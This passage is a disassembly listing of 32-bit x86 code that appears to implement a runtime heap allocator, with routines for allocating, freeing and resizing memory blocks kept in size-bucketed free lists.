  401cd6:	03 44 24 04          	add    0x4(%esp),%eax
  401cda:	8b 53 08             	mov    0x8(%ebx),%edx
  401cdd:	03 53 0c             	add    0xc(%ebx),%edx
  401ce0:	3b c2                	cmp    %edx,%eax
  401ce2:	73 0a                	jae    0x401cee
  401ce4:	8d 14 37             	lea    (%edi,%esi,1),%edx
  401ce7:	2b d0                	sub    %eax,%edx
  401ce9:	e8 aa fe ff ff       	call   0x401b98
  401cee:	8b d4                	mov    %esp,%edx
  401cf0:	8b c3                	mov    %ebx,%eax
  401cf2:	e8 a9 f6 ff ff       	call   0x4013a0
  401cf7:	b0 01                	mov    $0x1,%al
  401cf9:	59                   	pop    %ecx
  401cfa:	5a                   	pop    %edx
  401cfb:	5d                   	pop    %ebp
  401cfc:	5f                   	pop    %edi
  401cfd:	5e                   	pop    %esi
  401cfe:	5b                   	pop    %ebx
  401cff:	c3                   	ret
  401d00:	53                   	push   %ebx
  401d01:	56                   	push   %esi
  401d02:	57                   	push   %edi
  401d03:	8b f2                	mov    %edx,%esi
  401d05:	8b f8                	mov    %eax,%edi
  401d07:	8b df                	mov    %edi,%ebx
  401d09:	89 73 08             	mov    %esi,0x8(%ebx)
  401d0c:	8b c3                	mov    %ebx,%eax
  401d0e:	03 c6                	add    %esi,%eax
  401d10:	83 e8 0c             	sub    $0xc,%eax
  401d13:	89 70 08             	mov    %esi,0x8(%eax)
  401d16:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401d1c:	7f 30                	jg     0x401d4e
  401d1e:	8b d6                	mov    %esi,%edx
  401d20:	c1 ea 02             	shr    $0x2,%edx
  401d23:	a1 74 b4 40 00       	mov    0x40b474,%eax
  401d28:	8b 44 90 f4          	mov    -0xc(%eax,%edx,4),%eax
  401d2c:	85 c0                	test   %eax,%eax
  401d2e:	75 10                	jne    0x401d40
  401d30:	a1 74 b4 40 00       	mov    0x40b474,%eax
  401d35:	89 5c 90 f4          	mov    %ebx,-0xc(%eax,%edx,4)
  401d39:	89 5b 04             	mov    %ebx,0x4(%ebx)
  401d3c:	89 1b                	mov    %ebx,(%ebx)
  401d3e:	eb 3a                	jmp    0x401d7a
  401d40:	8b 10                	mov    (%eax),%edx
  401d42:	89 43 04             	mov    %eax,0x4(%ebx)
  401d45:	89 13                	mov    %edx,(%ebx)
  401d47:	89 18                	mov    %ebx,(%eax)
  401d49:	89 5a 04             	mov    %ebx,0x4(%edx)
  401d4c:	eb 2c                	jmp    0x401d7a
  401d4e:	81 fe 00 3c 00 00    	cmp    $0x3c00,%esi
  401d54:	7c 0d                	jl     0x401d63
  401d56:	8b d6                	mov    %esi,%edx
  401d58:	8b c7                	mov    %edi,%eax
  401d5a:	e8 09 ff ff ff       	call   0x401c68
  401d5f:	84 c0                	test   %al,%al
  401d61:	75 17                	jne    0x401d7a
  401d63:	a1 68 b4 40 00       	mov    0x40b468,%eax
  401d68:	89 1d 68 b4 40 00    	mov    %ebx,0x40b468
  401d6e:	8b 10                	mov    (%eax),%edx
  401d70:	89 43 04             	mov    %eax,0x4(%ebx)
  401d73:	89 13                	mov    %edx,(%ebx)
  401d75:	89 18                	mov    %ebx,(%eax)
  401d77:	89 5a 04             	mov    %ebx,0x4(%edx)
  401d7a:	5f                   	pop    %edi
  401d7b:	5e                   	pop    %esi
  401d7c:	5b                   	pop    %ebx
  401d7d:	c3                   	ret
  401d7e:	8b c0                	mov    %eax,%eax
  401d80:	83 3d 6c b4 40 00 00 	cmpl   $0x0,0x40b46c
  401d87:	7e 40                	jle    0x401dc9
  401d89:	83 3d 6c b4 40 00 0c 	cmpl   $0xc,0x40b46c
  401d90:	7d 0c                	jge    0x401d9e
  401d92:	c7 05 18 b4 40 00 07 	movl   $0x7,0x40b418
  401d99:	00 00 00 
  401d9c:	eb 2b                	jmp    0x401dc9
  401d9e:	a1 6c b4 40 00       	mov    0x40b46c,%eax
  401da3:	83 c8 02             	or     $0x2,%eax
  401da6:	8b 15 70 b4 40 00    	mov    0x40b470,%edx
  401dac:	89 02                	mov    %eax,(%edx)
  401dae:	a1 70 b4 40 00       	mov    0x40b470,%eax
  401db3:	83 c0 04             	add    $0x4,%eax
  401db6:	e8 b9 fd ff ff       	call   0x401b74
  401dbb:	33 c0                	xor    %eax,%eax
  401dbd:	a3 70 b4 40 00       	mov    %eax,0x40b470
  401dc2:	33 c0                	xor    %eax,%eax
  401dc4:	a3 6c b4 40 00       	mov    %eax,0x40b46c
  401dc9:	c3                   	ret
  401dca:	8b c0                	mov    %eax,%eax
  401dcc:	53                   	push   %ebx
  401dcd:	56                   	push   %esi
  401dce:	57                   	push   %edi
  401dcf:	83 c4 f0             	add    $0xfffffff0,%esp
  401dd2:	8b f0                	mov    %eax,%esi
  401dd4:	8d 3c 24             	lea    (%esp),%edi
  401dd7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401dd8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401dd9:	8b fc                	mov    %esp,%edi
  401ddb:	e8 a0 ff ff ff       	call   0x401d80
  401de0:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401de4:	8b d7                	mov    %edi,%edx
  401de6:	b8 78 b4 40 00       	mov    $0x40b478,%eax
  401deb:	e8 3c f5 ff ff       	call   0x40132c
  401df0:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401df4:	85 db                	test   %ebx,%ebx
  401df6:	75 04                	jne    0x401dfc
  401df8:	33 c0                	xor    %eax,%eax
  401dfa:	eb 52                	jmp    0x401e4e
  401dfc:	8b 07                	mov    (%edi),%eax
  401dfe:	3b d8                	cmp    %eax,%ebx
  401e00:	73 0a                	jae    0x401e0c
  401e02:	e8 b9 fd ff ff       	call   0x401bc0
  401e07:	29 07                	sub    %eax,(%edi)
  401e09:	01 47 04             	add    %eax,0x4(%edi)
  401e0c:	8b 07                	mov    (%edi),%eax
  401e0e:	03 47 04             	add    0x4(%edi),%eax
  401e11:	8b f3                	mov    %ebx,%esi
  401e13:	03 74 24 0c          	add    0xc(%esp),%esi
  401e17:	3b c6                	cmp    %esi,%eax
  401e19:	73 08                	jae    0x401e23
  401e1b:	e8 10 fe ff ff       	call   0x401c30
  401e20:	01 47 04             	add    %eax,0x4(%edi)
  401e23:	8b 07                	mov    (%edi),%eax
  401e25:	03 47 04             	add    0x4(%edi),%eax
  401e28:	3b f0                	cmp    %eax,%esi
  401e2a:	75 11                	jne    0x401e3d
  401e2c:	83 e8 04             	sub    $0x4,%eax
  401e2f:	ba 04 00 00 00       	mov    $0x4,%edx
  401e34:	e8 0b fd ff ff       	call   0x401b44
  401e39:	83 6f 04 04          	subl   $0x4,0x4(%edi)
  401e3d:	8b 07                	mov    (%edi),%eax
  401e3f:	a3 70 b4 40 00       	mov    %eax,0x40b470
  401e44:	8b 47 04             	mov    0x4(%edi),%eax
  401e47:	a3 6c b4 40 00       	mov    %eax,0x40b46c
  401e4c:	b0 01                	mov    $0x1,%al
  401e4e:	83 c4 10             	add    $0x10,%esp
  401e51:	5f                   	pop    %edi
  401e52:	5e                   	pop    %esi
  401e53:	5b                   	pop    %ebx
  401e54:	c3                   	ret
  401e55:	8d 40 00             	lea    0x0(%eax),%eax
  401e58:	53                   	push   %ebx
  401e59:	83 c4 f8             	add    $0xfffffff8,%esp
  401e5c:	8b d8                	mov    %eax,%ebx
  401e5e:	8b d4                	mov    %esp,%edx
  401e60:	8d 43 04             	lea    0x4(%ebx),%eax
  401e63:	e8 70 f8 ff ff       	call   0x4016d8
  401e68:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401e6c:	74 0b                	je     0x401e79
  401e6e:	8b c4                	mov    %esp,%eax
  401e70:	e8 57 ff ff ff       	call   0x401dcc
  401e75:	84 c0                	test   %al,%al
  401e77:	75 04                	jne    0x401e7d
  401e79:	33 c0                	xor    %eax,%eax
  401e7b:	eb 02                	jmp    0x401e7f
  401e7d:	b0 01                	mov    $0x1,%al
  401e7f:	59                   	pop    %ecx
  401e80:	5a                   	pop    %edx
  401e81:	5b                   	pop    %ebx
  401e82:	c3                   	ret
  401e83:	90                   	nop
  401e84:	53                   	push   %ebx
  401e85:	56                   	push   %esi
  401e86:	83 c4 f8             	add    $0xfffffff8,%esp
  401e89:	8b f2                	mov    %edx,%esi
  401e8b:	8b d8                	mov    %eax,%ebx
  401e8d:	8b cc                	mov    %esp,%ecx
  401e8f:	8d 56 04             	lea    0x4(%esi),%edx
  401e92:	8b c3                	mov    %ebx,%eax
  401e94:	e8 cf f8 ff ff       	call   0x401768
  401e99:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401e9d:	74 0b                	je     0x401eaa
  401e9f:	8b c4                	mov    %esp,%eax
  401ea1:	e8 26 ff ff ff       	call   0x401dcc
  401ea6:	84 c0                	test   %al,%al
  401ea8:	75 04                	jne    0x401eae
  401eaa:	33 c0                	xor    %eax,%eax
  401eac:	eb 02                	jmp    0x401eb0
  401eae:	b0 01                	mov    $0x1,%al
  401eb0:	59                   	pop    %ecx
  401eb1:	5a                   	pop    %edx
  401eb2:	5e                   	pop    %esi
  401eb3:	5b                   	pop    %ebx
  401eb4:	c3                   	ret
  401eb5:	8d 40 00             	lea    0x0(%eax),%eax
  401eb8:	33 d2                	xor    %edx,%edx
  401eba:	c1 e8 02             	shr    $0x2,%eax
  401ebd:	3d 00 04 00 00       	cmp    $0x400,%eax
  401ec2:	77 16                	ja     0x401eda
  401ec4:	8b 15 74 b4 40 00    	mov    0x40b474,%edx
  401eca:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  401ece:	85 d2                	test   %edx,%edx
  401ed0:	75 08                	jne    0x401eda
  401ed2:	40                   	inc    %eax
  401ed3:	3d 01 04 00 00       	cmp    $0x401,%eax
  401ed8:	75 ea                	jne    0x401ec4
  401eda:	8b c2                	mov    %edx,%eax
  401edc:	c3                   	ret
  401edd:	8d 40 00             	lea    0x0(%eax),%eax
  401ee0:	53                   	push   %ebx
  401ee1:	56                   	push   %esi
  401ee2:	57                   	push   %edi
  401ee3:	55                   	push   %ebp
  401ee4:	8b f0                	mov    %eax,%esi
  401ee6:	bf 68 b4 40 00       	mov    $0x40b468,%edi
  401eeb:	bd 6c b4 40 00       	mov    $0x40b46c,%ebp
  401ef0:	8b 1d 60 b4 40 00    	mov    0x40b460,%ebx
  401ef6:	3b 73 08             	cmp    0x8(%ebx),%esi
  401ef9:	0f 8e 84 00 00 00    	jle    0x401f83
  401eff:	8b 1f                	mov    (%edi),%ebx
  401f01:	8b 43 08             	mov    0x8(%ebx),%eax
  401f04:	3b f0                	cmp    %eax,%esi
  401f06:	7e 7b                	jle    0x401f83
  401f08:	89 73 08             	mov    %esi,0x8(%ebx)
  401f0b:	8b 5b 04             	mov    0x4(%ebx),%ebx
  401f0e:	3b 73 08             	cmp    0x8(%ebx),%esi
  401f11:	7f f8                	jg     0x401f0b
  401f13:	8b 17                	mov    (%edi),%edx
  401f15:	89 42 08             	mov    %eax,0x8(%edx)
  401f18:	3b 1f                	cmp    (%edi),%ebx
  401f1a:	74 04                	je     0x401f20
  401f1c:	89 1f                	mov    %ebx,(%edi)
  401f1e:	eb 63                	jmp    0x401f83
  401f20:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401f26:	7f 0d                	jg     0x401f35
  401f28:	8b c6                	mov    %esi,%eax
  401f2a:	e8 89 ff ff ff       	call   0x401eb8
  401f2f:	8b d8                	mov    %eax,%ebx
  401f31:	85 db                	test   %ebx,%ebx
  401f33:	75 4e                	jne    0x401f83
  401f35:	8b c6                	mov    %esi,%eax
  401f37:	e8 1c ff ff ff       	call   0x401e58
  401f3c:	84 c0                	test   %al,%al
  401f3e:	75 07                	jne    0x401f47
  401f40:	33 c0                	xor    %eax,%eax
  401f42:	e9 88 00 00 00       	jmp    0x401fcf
  401f47:	3b 75 00             	cmp    0x0(%ebp),%esi
  401f4a:	7f a4                	jg     0x401ef0
  401f4c:	29 75 00             	sub    %esi,0x0(%ebp)
  401f4f:	83 7d 00 0c          	cmpl   $0xc,0x0(%ebp)
  401f53:	7d 08                	jge    0x401f5d
  401f55:	03 75 00             	add    0x0(%ebp),%esi
  401f58:	33 c0                	xor    %eax,%eax
  401f5a:	89 45 00             	mov    %eax,0x0(%ebp)
  401f5d:	a1 70 b4 40 00       	mov    0x40b470,%eax
  401f62:	01 35 70 b4 40 00    	add    %esi,0x40b470
  401f68:	8b d6                	mov    %esi,%edx
  401f6a:	83 ca 02             	or     $0x2,%edx
  401f6d:	89 10                	mov    %edx,(%eax)
  401f6f:	83 c0 04             	add    $0x4,%eax
  401f72:	ff 05 fc b3 40 00    	incl   0x40b3fc
  401f78:	83 ee 04             	sub    $0x4,%esi
  401f7b:	01 35 00 b4 40 00    	add    %esi,0x40b400
  401f81:	eb 4c                	jmp    0x401fcf
  401f83:	8b c3                	mov    %ebx,%eax
  401f85:	e8 36 fb ff ff       	call   0x401ac0
  401f8a:	8b 53 08             	mov    0x8(%ebx),%edx
  401f8d:	8b c2                	mov    %edx,%eax
  401f8f:	2b c6                	sub    %esi,%eax
  401f91:	83 f8 0c             	cmp    $0xc,%eax
  401f94:	7c 0c                	jl     0x401fa2
  401f96:	8b d3                	mov    %ebx,%edx
  401f98:	03 d6                	add    %esi,%edx
  401f9a:	92                   	xchg   %eax,%edx
  401f9b:	e8 60 fd ff ff       	call   0x401d00
  401fa0:	eb 12                	jmp    0x401fb4
  401fa2:	8b f2                	mov    %edx,%esi
  401fa4:	3b 1f                	cmp    (%edi),%ebx
  401fa6:	75 05                	jne    0x401fad
  401fa8:	8b 43 04             	mov    0x4(%ebx),%eax
  401fab:	89 07                	mov    %eax,(%edi)
  401fad:	8b c3                	mov    %ebx,%eax
  401faf:	03 c6                	add    %esi,%eax
  401fb1:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401fb4:	8b c3                	mov    %ebx,%eax
  401fb6:	8b d6                	mov    %esi,%edx
  401fb8:	83 ca 02             	or     $0x2,%edx
  401fbb:	89 10                	mov    %edx,(%eax)
  401fbd:	83 c0 04             	add    $0x4,%eax
  401fc0:	ff 05 fc b3 40 00    	incl   0x40b3fc
  401fc6:	83 ee 04             	sub    $0x4,%esi
  401fc9:	01 35 00 b4 40 00    	add    %esi,0x40b400
  401fcf:	5d                   	pop    %ebp
  401fd0:	5f                   	pop    %edi
  401fd1:	5e                   	pop    %esi
  401fd2:	5b                   	pop    %ebx
  401fd3:	c3                   	ret
  401fd4:	55                   	push   %ebp
  401fd5:	8b ec                	mov    %esp,%ebp
  401fd7:	83 c4 f8             	add    $0xfffffff8,%esp
  401fda:	53                   	push   %ebx
  401fdb:	56                   	push   %esi
  401fdc:	57                   	push   %edi
  401fdd:	8b d8                	mov    %eax,%ebx
  401fdf:	80 3d 15 b4 40 00 00 	cmpb   $0x0,0x40b415
  401fe6:	75 13                	jne    0x401ffb
  401fe8:	e8 2b f9 ff ff       	call   0x401918
  401fed:	84 c0                	test   %al,%al
  401fef:	75 0a                	jne    0x401ffb
  401ff1:	33 c0                	xor    %eax,%eax
  401ff3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ff6:	e9 54 01 00 00       	jmp    0x40214f
  401ffb:	33 f6                	xor    %esi,%esi
  401ffd:	55                   	push   %ebp
  401ffe:	68 48 21 40 00       	push   $0x402148
  402003:	64 ff 36             	push   %fs:(%esi)
  402006:	64 89 26             	mov    %esp,%fs:(%esi)
  402009:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  402010:	74 0a                	je     0x40201c
  402012:	68 1c b4 40 00       	push   $0x40b41c
  402017:	e8 58 f2 ff ff       	call   0x401274
  40201c:	83 c3 07             	add    $0x7,%ebx
  40201f:	83 e3 fc             	and    $0xfffffffc,%ebx
  402022:	83 fb 0c             	cmp    $0xc,%ebx
  402025:	7d 05                	jge    0x40202c
  402027:	bb 0c 00 00 00       	mov    $0xc,%ebx
  40202c:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  402032:	0f 8f 93 00 00 00    	jg     0x4020cb
  402038:	8b c3                	mov    %ebx,%eax
  40203a:	85 c0                	test   %eax,%eax
  40203c:	79 03                	jns    0x402041
  40203e:	83 c0 03             	add    $0x3,%eax
  402041:	c1 f8 02             	sar    $0x2,%eax
  402044:	8b 15 74 b4 40 00    	mov    0x40b474,%edx
  40204a:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  40204e:	85 d2                	test   %edx,%edx
  402050:	74 79                	je     0x4020cb
  402052:	8b ca                	mov    %edx,%ecx
  402054:	8b c1                	mov    %ecx,%eax
  402056:	03 c3                	add    %ebx,%eax
  402058:	83 20 fe             	andl   $0xfffffffe,(%eax)
  40205b:	8b 42 04             	mov    0x4(%edx),%eax
  40205e:	3b d0                	cmp    %eax,%edx
  402060:	75 1a                	jne    0x40207c
  402062:	8b c3                	mov    %ebx,%eax
  402064:	85 c0                	test   %eax,%eax
  402066:	79 03                	jns    0x40206b
  402068:	83 c0 03             	add    $0x3,%eax
  40206b:	c1 f8 02             	sar    $0x2,%eax
  40206e:	8b 35 74 b4 40 00    	mov    0x40b474,%esi
  402074:	33 ff                	xor    %edi,%edi
  402076:	89 7c 86 f4          	mov    %edi,-0xc(%esi,%eax,4)
  40207a:	eb 26                	jmp    0x4020a2
  40207c:	8b f3                	mov    %ebx,%esi
  40207e:	85 f6                	test   %esi,%esi
  402080:	79 03                	jns    0x402085
  402082:	83 c6 03             	add    $0x3,%esi
  402085:	c1 fe 02             	sar    $0x2,%esi
  402088:	8b 3d 74 b4 40 00    	mov    0x40b474,%edi
  40208e:	89 44 b7 f4          	mov    %eax,-0xc(%edi,%esi,4)
  402092:	8b 32                	mov    (%edx),%esi
  402094:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402097:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40209a:	89 46 04             	mov    %eax,0x4(%esi)
  40209d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4020a0:	89 30                	mov    %esi,(%eax)
  4020a2:	8b c1                	mov    %ecx,%eax
  4020a4:	8b 52 08             	mov    0x8(%edx),%edx
  4020a7:	83 ca 02             	or     $0x2,%edx
  4020aa:	89 10                	mov    %edx,(%eax)
  4020ac:	83 c0 04             	add    $0x4,%eax
  4020af:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4020b2:	ff 05 fc b3 40 00    	incl   0x40b3fc
  4020b8:	83 eb 04             	sub    $0x4,%ebx
  4020bb:	01 1d 00 b4 40 00    	add    %ebx,0x40b400
  4020c1:	e8 8e 0e 00 00       	call   0x402f54
  4020c6:	e9 84 00 00 00       	jmp    0x40214f
  4020cb:	3b 1d 6c b4 40 00    	cmp    0x40b46c,%ebx
  4020d1:	7f 4a                	jg     0x40211d
  4020d3:	29 1d 6c b4 40 00    	sub    %ebx,0x40b46c
  4020d9:	83 3d 6c b4 40 00 0c 	cmpl   $0xc,0x40b46c
  4020e0:	7d 0d                	jge    0x4020ef
  4020e2:	03 1d 6c b4 40 00    	add    0x40b46c,%ebx
  4020e8:	33 c0                	xor    %eax,%eax
  4020ea:	a3 6c b4 40 00       	mov    %eax,0x40b46c
  4020ef:	a1 70 b4 40 00       	mov    0x40b470,%eax
  4020f4:	01 1d 70 b4 40 00    	add    %ebx,0x40b470
  4020fa:	8b d3                	mov    %ebx,%edx
  4020fc:	83 ca 02             	or     $0x2,%edx
  4020ff:	89 10                	mov    %edx,(%eax)
  402101:	83 c0 04             	add    $0x4,%eax
  402104:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402107:	ff 05 fc b3 40 00    	incl   0x40b3fc
  40210d:	83 eb 04             	sub    $0x4,%ebx
  402110:	01 1d 00 b4 40 00    	add    %ebx,0x40b400
  402116:	e8 39 0e 00 00       	call   0x402f54
  40211b:	eb 32                	jmp    0x40214f
  40211d:	8b c3                	mov    %ebx,%eax
  40211f:	e8 bc fd ff ff       	call   0x401ee0
  402124:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402127:	33 c0                	xor    %eax,%eax
  402129:	5a                   	pop    %edx
  40212a:	59                   	pop    %ecx
  40212b:	59                   	pop    %ecx
  40212c:	64 89 10             	mov    %edx,%fs:(%eax)
  40212f:	68 4f 21 40 00       	push   $0x40214f
  402134:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  40213b:	74 0a                	je     0x402147
  40213d:	68 1c b4 40 00       	push   $0x40b41c
  402142:	e8 35 f1 ff ff       	call   0x40127c
  402147:	c3                   	ret
  402148:	e9 af 0c 00 00       	jmp    0x402dfc
  40214d:	eb e5                	jmp    0x402134
  40214f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402152:	5f                   	pop    %edi
  402153:	5e                   	pop    %esi
  402154:	5b                   	pop    %ebx
  402155:	59                   	pop    %ecx
  402156:	59                   	pop    %ecx
  402157:	5d                   	pop    %ebp
  402158:	c3                   	ret
  402159:	8d 40 00             	lea    0x0(%eax),%eax
  40215c:	55                   	push   %ebp
  40215d:	8b ec                	mov    %esp,%ebp
  40215f:	51                   	push   %ecx
  402160:	53                   	push   %ebx
  402161:	56                   	push   %esi
  402162:	57                   	push   %edi
  402163:	8b d8                	mov    %eax,%ebx
  402165:	33 c0                	xor    %eax,%eax
  402167:	a3 18 b4 40 00       	mov    %eax,0x40b418
  40216c:	80 3d 15 b4 40 00 00 	cmpb   $0x0,0x40b415
  402173:	75 1f                	jne    0x402194
  402175:	e8 9e f7 ff ff       	call   0x401918
  40217a:	84 c0                	test   %al,%al
  40217c:	75 16                	jne    0x402194
  40217e:	c7 05 18 b4 40 00 08 	movl   $0x8,0x40b418
  402185:	00 00 00 
  402188:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  40218f:	e9 61 01 00 00       	jmp    0x4022f5
  402194:	33 c9                	xor    %ecx,%ecx
  402196:	55                   	push   %ebp
  402197:	68 ee 22 40 00       	push   $0x4022ee
  40219c:	64 ff 31             	push   %fs:(%ecx)
  40219f:	64 89 21             	mov    %esp,%fs:(%ecx)
  4021a2:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  4021a9:	74 0a                	je     0x4021b5
  4021ab:	68 1c b4 40 00       	push   $0x40b41c
  4021b0:	e8 bf f0 ff ff       	call   0x401274
  4021b5:	8b f3                	mov    %ebx,%esi
  4021b7:	83 ee 04             	sub    $0x4,%esi
  4021ba:	8b 1e                	mov    (%esi),%ebx
  4021bc:	f6 c3 02             	test   $0x2,%bl
  4021bf:	75 0f                	jne    0x4021d0
  4021c1:	c7 05 18 b4 40 00 09 	movl   $0x9,0x40b418
  4021c8:	00 00 00 
  4021cb:	e9 f5 00 00 00       	jmp    0x4022c5
  4021d0:	ff 0d fc b3 40 00    	decl   0x40b3fc
  4021d6:	8b c3                	mov    %ebx,%eax
  4021d8:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4021dd:	83 e8 04             	sub    $0x4,%eax
  4021e0:	29 05 00 b4 40 00    	sub    %eax,0x40b400
  4021e6:	f6 c3 01             	test   $0x1,%bl
  4021e9:	74 45                	je     0x402230
  4021eb:	8b c6                	mov    %esi,%eax
  4021ed:	83 e8 0c             	sub    $0xc,%eax
  4021f0:	8b 50 08             	mov    0x8(%eax),%edx
  4021f3:	83 fa 0c             	cmp    $0xc,%edx
  4021f6:	7c 08                	jl     0x402200
  4021f8:	f7 c2 03 00 00 80    	test   $0x80000003,%edx
  4021fe:	74 0f                	je     0x40220f
  402200:	c7 05 18 b4 40 00 0a 	movl   $0xa,0x40b418
  402207:	00 00 00 
  40220a:	e9 b6 00 00 00       	jmp    0x4022c5
  40220f:	8b c6                	mov    %esi,%eax
  402211:	2b c2                	sub    %edx,%eax
  402213:	3b 50 08             	cmp    0x8(%eax),%edx
  402216:	74 0f                	je     0x402227
  402218:	c7 05 18 b4 40 00 0a 	movl   $0xa,0x40b418
  40221f:	00 00 00 
  402222:	e9 9e 00 00 00       	jmp    0x4022c5
  402227:	03 da                	add    %edx,%ebx
  402229:	8b f0                	mov    %eax,%esi
  40222b:	e8 90 f8 ff ff       	call   0x401ac0
  402230:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  402236:	8b c6                	mov    %esi,%eax
  402238:	03 c3                	add    %ebx,%eax
  40223a:	8b f8                	mov    %eax,%edi
  40223c:	3b 3d 70 b4 40 00    	cmp    0x40b470,%edi
  402242:	75 2c                	jne    0x402270
  402244:	29 1d 70 b4 40 00    	sub    %ebx,0x40b470
  40224a:	01 1d 6c b4 40 00    	add    %ebx,0x40b46c
  402250:	81 3d 6c b4 40 00 00 	cmpl   $0x3c00,0x40b46c
  402257:	3c 00 00 
  40225a:	7e 05                	jle    0x402261
  40225c:	e8 1f fb ff ff       	call   0x401d80
  402261:	33 c0                	xor    %eax,%eax
  402263:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402266:	e8 e9 0c 00 00       	call   0x402f54
  40226b:	e9 85 00 00 00       	jmp    0x4022f5
  402270:	8b 10                	mov    (%eax),%edx
  402272:	f6 c2 02             	test   $0x2,%dl
  402275:	74 1c                	je     0x402293
  402277:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  40227d:	83 fa 04             	cmp    $0x4,%edx
  402280:	7d 0c                	jge    0x40228e
  402282:	c7 05 18 b4 40 00 0b 	movl   $0xb,0x40b418
  402289:	00 00 00 
  40228c:	eb 37                	jmp    0x4022c5
  40228e:	83 08 01             	orl    $0x1,(%eax)
  402291:	eb 29                	jmp    0x4022bc
  402293:	8b c7                	mov    %edi,%eax
  402295:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402299:	74 0b                	je     0x4022a6
  40229b:	83 38 00             	cmpl   $0x0,(%eax)
  40229e:	74 06                	je     0x4022a6
  4022a0:	83 78 08 0c          	cmpl   $0xc,0x8(%eax)
  4022a4:	7d 0c                	jge    0x4022b2
  4022a6:	c7 05 18 b4 40 00 0b 	movl   $0xb,0x40b418
  4022ad:	00 00 00 
  4022b0:	eb 13                	jmp    0x4022c5
  4022b2:	8b 50 08             	mov    0x8(%eax),%edx
  4022b5:	03 da                	add    %edx,%ebx
  4022b7:	e8 04 f8 ff ff       	call   0x401ac0
  4022bc:	8b d3                	mov    %ebx,%edx
  4022be:	8b c6                	mov    %esi,%eax
  4022c0:	e8 3b fa ff ff       	call   0x401d00
  4022c5:	a1 18 b4 40 00       	mov    0x40b418,%eax
  4022ca:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4022cd:	33 c0                	xor    %eax,%eax
  4022cf:	5a                   	pop    %edx
  4022d0:	59                   	pop    %ecx
  4022d1:	59                   	pop    %ecx
  4022d2:	64 89 10             	mov    %edx,%fs:(%eax)
  4022d5:	68 f5 22 40 00       	push   $0x4022f5
  4022da:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  4022e1:	74 0a                	je     0x4022ed
  4022e3:	68 1c b4 40 00       	push   $0x40b41c
  4022e8:	e8 8f ef ff ff       	call   0x40127c
  4022ed:	c3                   	ret
  4022ee:	e9 09 0b 00 00       	jmp    0x402dfc
  4022f3:	eb e5                	jmp    0x4022da
  4022f5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4022f8:	5f                   	pop    %edi
  4022f9:	5e                   	pop    %esi
  4022fa:	5b                   	pop    %ebx
  4022fb:	59                   	pop    %ecx
  4022fc:	5d                   	pop    %ebp
  4022fd:	c3                   	ret
  4022fe:	8b c0                	mov    %eax,%eax
  402300:	53                   	push   %ebx
  402301:	56                   	push   %esi
  402302:	57                   	push   %edi
  402303:	55                   	push   %ebp
  402304:	83 c4 f8             	add    $0xfffffff8,%esp
  402307:	8b f2                	mov    %edx,%esi
  402309:	83 c6 07             	add    $0x7,%esi
  40230c:	83 e6 fc             	and    $0xfffffffc,%esi
  40230f:	83 fe 0c             	cmp    $0xc,%esi
  402312:	7d 05                	jge    0x402319
  402314:	be 0c 00 00 00       	mov    $0xc,%esi
  402319:	8b e8                	mov    %eax,%ebp
  40231b:	83 ed 04             	sub    $0x4,%ebp
  40231e:	8b 7d 00             	mov    0x0(%ebp),%edi
  402321:	81 e7 fc ff ff 7f    	and    $0x7ffffffc,%edi
  402327:	8b c5                	mov    %ebp,%eax
  402329:	03 c7                	add    %edi,%eax
  40232b:	8b d8                	mov    %eax,%ebx
  40232d:	3b fe                	cmp    %esi,%edi
  40232f:	0f 82 83 00 00 00    	jb     0x4023b8
  402335:	8b d7                	mov    %edi,%edx
  402337:	2b d6                	sub    %esi,%edx
  402339:	89 14 24             	mov    %edx,(%esp)
  40233c:	3b 1d 70 b4 40 00    	cmp    0x40b470,%ebx
  402342:	75 38                	jne    0x40237c
  402344:	8b 04 24             	mov    (%esp),%eax
  402347:	29 05 70 b4 40 00    	sub    %eax,0x40b470
  40234d:	8b 04 24             	mov    (%esp),%eax
  402350:	01 05 6c b4 40 00    	add    %eax,0x40b46c
  402356:	83 3d 6c b4 40 00 0c 	cmpl   $0xc,0x40b46c
  40235d:	0f 8d 4c 01 00 00    	jge    0x4024af
  402363:	8b 04 24             	mov    (%esp),%eax
  402366:	01 05 70 b4 40 00    	add    %eax,0x40b470
  40236c:	8b 04 24             	mov    (%esp),%eax
  40236f:	29 05 6c b4 40 00    	sub    %eax,0x40b46c
  402375:	8b f7                	mov    %edi,%esi
  402377:	e9 33 01 00 00       	jmp    0x4024af
  40237c:	8b d8                	mov    %eax,%ebx
  40237e:	f6 03 02             	testb  $0x2,(%ebx)
  402381:	75 0d                	jne    0x402390
  402383:	8b c3                	mov    %ebx,%eax
  402385:	8b 50 08             	mov    0x8(%eax),%edx
  402388:	01 14 24             	add    %edx,(%esp)
  40238b:	e8 30 f7 ff ff       	call   0x401ac0
  402390:	83 3c 24 0c          	cmpl   $0xc,(%esp)
